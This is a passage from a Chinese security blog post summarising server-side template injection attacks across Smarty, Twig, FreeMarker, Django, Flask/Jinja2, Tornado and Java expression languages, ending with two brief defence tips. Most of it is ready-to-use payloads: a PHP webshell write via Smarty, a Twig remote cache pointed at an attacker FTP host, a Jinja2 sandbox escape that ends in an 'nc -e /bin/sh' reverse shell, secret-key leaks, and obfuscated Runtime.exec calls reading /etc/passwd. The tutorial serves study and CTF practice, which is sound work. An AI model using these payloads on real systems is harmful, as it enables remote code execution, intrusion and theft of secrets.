<p><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0WAmi8.png" alt="0WAmi8.png"></p>

<p><strong>注意：</strong>有的时候出现 XSS 的时候，也有可能是 SSTI 漏洞，虽说模板引擎在大多数情况下都是使用的xss 过滤的，但是也不排除有些意外情况的出现，比如
有的模板引擎(比如 jinja2)在渲染的时候默认只针对特定的文件后缀名的文件(html,xhtml等)进行XSS过滤</p>

<p>这里提供一个大牛写的 SSTI 的检测工具 https://github.com/epinna/tplmap</p>

<h2 id="0x06-攻击思路"><strong>0X06 攻击思路</strong></h2>

<h3 id="1攻击方向"><strong>1.攻击方向：</strong></h3>

<p>找到模板注入主要从三个方向进行攻击</p>

<p>(1)模板本身
(2)框架本身
(3)语言本身
(4)应用本身</p>

<h3 id="2攻击方法"><strong>2.攻击方法：</strong></h3>

<p>我们知道 SSTI 能够造成很多种危害，包括 敏感信息泄露、RCE、GetShell 等，关键就在于如何才能利用这个注入点执行我们想执行的代码，那么我们寻找利用点的范围实际上就是在我们上面的四个地方，一个是模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数，然后我们考虑语言本身的特性，比如 面向对象的内省机制，最最最后我们无能为力的时候才考虑怎么寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑，于是我将其放在最后一个</p>

<p><strong>注意：</strong></p>

<p>在这种面向对象的语言中，获取父类这种思想要贯穿始终，理论基础就是 Python 的魔法方法 PHP 的自省 JAVA 的反射 机制</p>

<h4 id="1利用模板本身的特性进行攻击"><strong>1.利用模板本身的特性进行攻击</strong></h4>

<h4 id="1利用模板本身的特性进行攻击-1"><strong>1.利用模板本身的特性进行攻击</strong></h4>

<h5 id="1smarty"><strong>1.Smarty</strong></h5>

<p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>

<p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的好用的方法</p>

<p>比如：<a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></p>

<p>github 中明确指出，这个方法可以获取传入变量的流（说人话就是读文件）</p>

<p><strong>payload:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{self::getStreamVariable("file:///proc/self/loginuid")}
</code></pre></div></div>

<p>再比如：<a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a></p>

<p>有了上面的读文件当然要找一个写文件的了，这个类中有一个writeFile方法</p>

<p><strong>函数原型：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public function writeFile($_filepath, $_contents, Smarty $smarty)
</code></pre></div></div>

<p>但是这个第三个参数是一个 Smarty 类型，后来找到了 <code class="language-plaintext highlighter-rouge">self::clearConfig()</code></p>

<p><strong>函数原型：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public function clearConfig($varname = null)
{
    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
}
</code></pre></div></div>

<p>能写文件对攻击者真的是太有利了，一般不出意外能直接 getshell</p>

<p><strong>payload：</strong></p>

<pre><code class="language-url">Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php passthru($_GET['cmd']); ?&gt;",self::clearConfig())}
</code></pre>

<h5 id="2twig"><strong>2.Twig</strong></h5>

<p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code class="language-plaintext highlighter-rouge">self::</code> 调用静态变量了，但是 通过<a href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a>的查询</p>

<p><strong>如下图所示：</strong></p>

<p><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0WKtxK.png" alt="0WKtxK.png"></p>

<p>Twig 给我们提供了一个 <code class="language-plaintext highlighter-rouge">_self</code>, 虽然 <code class="language-plaintext highlighter-rouge">_self</code> 本身没有什么有用的方法，但是却有一个 env</p>

<p><strong>如下图所示：</strong></p>

<p><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0WKBad.png" alt="0WKBad.png"></p>

<p>因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：</p>

<p><strong>payload:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{ {_self.env.setCache("ftp://attacker.net:2121")} }
{ {_self.env.loadTemplate("backdoor")} }
</code></pre></div></div>

<p><strong>但是新的问题出现了</strong>，allow_url_include 一般是不打开的，没法包含远程文件，没关系还有个调用过滤器的函数 <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p>

<p>这个函数中调用了一个 call_user_function 方法</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public function getFilter($name)
{
        [snip]
        foreach ($this-&gt;filterCallbacks as $callback) {
        if (false !== $filter = call_user_func($callback, $name)) {//注意这行
            return $filter;
        }
    }
    return false;
}

public function registerUndefinedFilterCallback($callable)
{
    $this-&gt;filterCallbacks[] = $callable;
} 
</code></pre></div></div>

<p>我们只要把exec() 作为回调函数传进去就能实现命令执行了</p>

<p><strong>payload:</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span><span class="n">_self</span><span class="p">.</span><span class="n">env</span><span class="p">.</span><span class="n">registerUndefinedFilterCallback</span><span class="p">(</span><span class="s">"exec"</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>

<span class="p">{</span> <span class="p">{</span><span class="n">_self</span><span class="p">.</span><span class="n">env</span><span class="p">.</span><span class="n">getFilter</span><span class="p">(</span><span class="s">"id"</span><span class="p">)}</span> <span class="p">}</span>
</code></pre></div></div>

<h5 id="3freemarker"><strong>3.freeMarker</strong></h5>

<p>这个模板主要用于 java ，在上面我举例 java 的 SSTI 的时候我已经简答的分析过这个的一个 payload，我希望读者也能按照 查找文档，查看框架源码，等方式寻找这个 payload 的思路来源</p>

<p><strong>payload:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ ex("id") }
</code></pre></div></div>

<h4 id="2利用框架本身的特性进行攻击"><strong>2.利用框架本身的特性进行攻击</strong></h4>

<p>因为这里面的摸吧模板似乎都是内置于框架内的，于是我就将其放在利用框架这一节</p>

<h5 id="1django"><strong>1.Django</strong></h5>

<pre><code class="language-{">def view(request, *args, **kwargs):
    template = 'Hello {user}, This is your email: ' + request.GET.get('email')
    return HttpResponse(template.format(user=request.user))
</code></pre>

<p>注入点很明显就是 email，但是如果我们的能力已经被限制的很死，很难执行命令，但又想获取和 User 有关的配置信息的话，我么怎么办？</p>

<p>可以发现我们现在拿到的只有有一个 和user 有关的变量，那就是 request user ，那我们的思路是什么？</p>

<p>p牛在自己的博客中分享了这个思路，我把它引用过来：</p>

<blockquote>
  <p>Django是一个庞大的框架，其数据库关系错综复杂，我们其实是可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，所以我的思路就是：去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</p>
</blockquote>

<p>什么意思，简单地说就是我们在没有应用源码的情况下要学会去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用，然后一步一步的靠近我们的目标</p>

<p>后来我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p>

<p><strong>如下图：</strong></p>

<p><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0WlWqO.png" alt="0WlWqO.png"></p>

<p>所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>

<p><strong>payload:</strong></p>

<pre><code class="language-url">http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}


http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
</code></pre>

<h5 id="2flaskjinja2"><strong>2.Flask/Jinja2</strong></h5>

<p>config 是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：from_envvar, from_object, from_pyfile, 以及root_path。</p>

<p><img src="file:///C:/Users/Mr.King/AppData/Roaming/Typora/typora-user-images/image-20201013130652692.png" alt="image-20201013130652692"></p>

<p>这里我们利用 from_pyfile 和 from_object 来命令执行，下面是这两个函数的源代码（为了阅读清晰，注释我删除了）</p>

<p><strong>源码：</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">from_pyfile</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">silent</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>

    <span class="n">filename</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">types</span><span class="p">.</span><span class="n">ModuleType</span><span class="p">(</span><span class="s">'config'</span><span class="p">)</span>
    <span class="n">d</span><span class="p">.</span><span class="n">__file__</span> <span class="o">=</span> <span class="n">filename</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="k">as</span> <span class="n">config_file</span><span class="p">:</span>
            <span class="k">exec</span><span class="p">(</span><span class="nb">compile</span><span class="p">(</span><span class="n">config_file</span><span class="p">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">filename</span><span class="p">,</span> <span class="s">'exec'</span><span class="p">),</span> <span class="n">d</span><span class="p">.</span><span class="n">__dict__</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">IOError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">silent</span> <span class="ow">and</span> <span class="n">e</span><span class="p">.</span><span class="n">errno</span> <span class="ow">in</span> <span class="p">(</span><span class="n">errno</span><span class="p">.</span><span class="n">ENOENT</span><span class="p">,</span> <span class="n">errno</span><span class="p">.</span><span class="n">EISDIR</span><span class="p">):</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="n">e</span><span class="p">.</span><span class="n">strerror</span> <span class="o">=</span> <span class="s">'Unable to load configuration file (%s)'</span> <span class="o">%</span> <span class="n">e</span><span class="p">.</span><span class="n">strerror</span>
        <span class="k">raise</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">from_object</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
    <span class="k">return</span> <span class="bp">True</span>


<span class="k">def</span> <span class="nf">from_object</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>

    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">string_types</span><span class="p">):</span>
        <span class="n">obj</span> <span class="o">=</span> <span class="n">import_string</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="n">obj</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">key</span><span class="p">.</span><span class="n">isupper</span><span class="p">():</span>
            <span class="bp">self</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>简单的解释一下这个方法：</strong></p>

<p>这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 <code class="language-plaintext highlighter-rouge">d.__dict__</code>翻阅文档发现，这个参数的含义是指定 exec 执行的上下文，</p>

<p><strong>如图所示：</strong></p>

<p><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0fyNvV.png" alt="0fyNvV.png"></p>

<p><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0f6bFJ.png" alt="0f6bFJ.png"></p>

<p><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0fcPFH.png" alt="0fcPFH.png"></p>

<p>执行的代码片段被放入了 <code class="language-plaintext highlighter-rouge">d.__dict__</code> 中,这看似没设么用，但是神奇的是后面他调用了 from_object() 方法，根据源码</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for key in dir(obj):
           if key.isupper():
               self[key] = getattr(obj, key)
</code></pre></div></div>

<p>这个方法会遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import system
SHELL = system
</code></pre></div></div>

<p>到时候我们就能通过 config[‘SHELL’] 调用 system 方法了</p>

<p>那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过可以参考我的一篇博文<a href="http://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/">python 沙盒逃逸备忘</a></p>

<p><strong>最终的 payload:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{ { ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') } }
//写文件
{ { config.from_pyfile('/tmp/evil') } }
//加载system
{ { config['SHELL']('nc xxxx xx -e /bin/sh') } }
//执行命令反弹SHELL
</code></pre></div></div>

<h5 id="3tornado"><strong>3.Tornado</strong></h5>

<p>写文章的时候正巧赶上护网杯出了一道 tornado 的 SSTI 于是这里也作为一个比较好的例子给大家说明</p>

<p>根据提示这道题的意思就是通过SSTI 获取 cookie_secret，但是这里过滤了很多东西</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"%'()*-/=[\]_|
</code></pre></div></div>

<p>甚至把_(下划线)都过滤了，也就是说我们没法通过Python 的魔法方法进行沙盒逃逸执行命令，并且实际上对我们的寻找合适的 tornado 的内置的方法也有很多的限制。</p>

<p>我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 cookie_secret</p>

<p><strong>如下图：</strong></p>

<p><img src="file:///C:/Users/Mr.King/AppData/Roaming/Typora/typora-user-images/image-20201013133737513.png" alt="image-20201013133737513"></p>

<p>你会发现 cookie_secret 是handler.application.settings 的键值，那我们只要获取到这个对象是不是就可以了，没错，那么 handler 是什么，看<a href="http://www.tornadoweb.org/en/stable/guide/templates.html#template-syntax">官方文档</a>，我特地看一下模板的对框架的语法支持(因为，模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest )</p>

<p><strong>如下图所示：</strong></p>

<p><a href="https://imgchr.com/i/0fgBVS"><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0fgBVS.png" alt="0fgBVS.png"></a></p>

<p>这里明确写着 handler 对应的就是 RequestHandler,那么也就是说，我们可以使用 handler 调用 RequestHandler 的方法，我们还是看<a href="https://www.tornadoweb.org/en/stable/web.html?highlight=RequestHandler">官方文档</a></p>

<p><strong>如下图所示：</strong></p>

<p><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0fggvq.png" alt="0fggvq.png"></p>

<p>很清楚，我么看到 RequestHandler.settings 是 self.application.settings 的别名，等等！ 有没有觉得有些似曾相识？对啊，这不就是我们之前在框架源码中找到的那个东西吗，也就是说我们能直接通过 handler.settings 访问到 我们朝思暮想的 cookie_secret ，至此我的分析就结束了。</p>

<p><strong>payload:</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">117.78</span><span class="p">.</span><span class="mf">26.79</span><span class="p">:</span><span class="mi">31093</span><span class="o">/</span><span class="n">error</span><span class="err">?</span><span class="n">msg</span><span class="o">=</span><span class="p">{</span> <span class="p">{</span><span class="n">handler</span><span class="p">.</span><span class="n">settings</span><span class="p">}</span> <span class="p">}</span>
</code></pre></div></div>

<h4 id="2利用模语言本身的特性进行攻击"><strong>2.利用模语言本身的特性进行攻击</strong></h4>

<h5 id="1python"><strong>1.Python</strong></h5>

<p>Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在我的<a href="http://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/">一篇博文</a>中</p>

<h5 id="2java"><strong>2.JAVA</strong></h5>

<p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类</p>

<p><strong>如下图所示：</strong></p>

<p><img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/0fgTPJ.png" alt="0fgTPJ.png"></p>

<p><strong>payload：</strong></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="o">{</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">System</span><span class="o">).</span><span class="na">getenv</span><span class="o">()}</span>
<span class="err">$</span><span class="o">{</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="err">'</span><span class="n">cat</span> <span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="err">'</span><span class="o">)}</span>
</code></pre></div></div>

<p>当然要是文件操作就要用另外的类了,思路是不变的</p>

<p><strong>payload：</strong></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="o">{</span><span class="no">T</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOUtils</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">99</span><span class="o">).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">97</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">116</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">32</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">47</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">101</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">116</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">99</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">47</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">112</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">97</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">115</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">115</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">119</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">100</span><span class="o">))).</span><span class="na">getInputStream</span><span class="o">())}</span>
</code></pre></div></div>

<p><strong>注意:</strong></p>

<p>这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p>

<h2 id="0x07-防御方法"><strong>0X07 防御方法</strong></h2>

<p>(1)和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制
(2)减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法</p>


                <hr style="visibility: hidden;">

                <ul class="pager">
                    
                    <li class="previous">
                        <a href="https://mrking00.github.io/2020/10/12/ThinkPHP%E6%96%87%E6%A1%A3/" data-toggle="tooltip" data-placement="top" title="ThinkPHP文档">
                        Previous<br>
                        <span>ThinkPHP文档</span>
                        </a>
                    </li>
                    
                    
                    <li class="next">
                        <a href="https://mrking00.github.io/2020/10/13/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" data-toggle="tooltip" data-placement="top" title="flask模板注入漏洞总结.md">
                        Next<br>
                        <span>flask模板注入漏洞总结.md</span>
                        </a>
                    </li>
                    
                </ul>


                <!--Gitalk评论start  -->
                
                <!-- Gitalk end -->

                

            </div>  

    <!-- Side Catalog Container -->
        
            <div class="
                col-lg-2 col-lg-offset-0
                visible-lg-block
                sidebar-container
                catalog-container">
                <div class="side-catalog fixed">
                    <hr class="hidden-sm hidden-xs">
                    <h5>
                        <a class="catalog-toggle" href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#">CATALOG</a>
                    </h5>
                    <ul class="catalog-body"><li class="h1_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93" rel="nofollow">模板注入SSTI漏洞总结</a></li><li class="h2_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80" rel="nofollow">前言</a></li><li class="h2_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x01-%E4%BB%80%E4%B9%88%E6%98%AF%E6%B3%A8%E5%85%A5" rel="nofollow">0X01 什么是注入：</a></li><li class="h2_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x02-%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5" rel="nofollow">0X02 什么是模板注入：</a></li><li class="h2_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x03-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E" rel="nofollow">0X03 常见的模板引擎</a></li><li class="h3_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1php-%E5%B8%B8%E7%94%A8%E7%9A%84" rel="nofollow">1.php 常用的</a></li><li class="h3_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#2java-%E5%B8%B8%E7%94%A8%E7%9A%84" rel="nofollow">2.Java 常用的</a></li><li class="h3_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#3python-%E5%B8%B8%E7%94%A8%E7%9A%84" rel="nofollow">3.Python 常用的</a></li><li class="h3_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E6%B3%A8%E6%84%8F" rel="nofollow">注意：</a></li><li class="h2_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x04-ssti-%E6%80%8E%E4%B9%88%E4%BA%A7%E7%94%9F%E7%9A%84" rel="nofollow">0X04 SSTI 怎么产生的</a></li><li class="h3_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1php-%E5%AE%9E%E4%BE%8B" rel="nofollow">1.PHP 实例</a></li><li class="h3_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#2python-%E5%AE%9E%E4%BE%8B" rel="nofollow">2.Python 实例</a></li><li class="h4_nav"><a 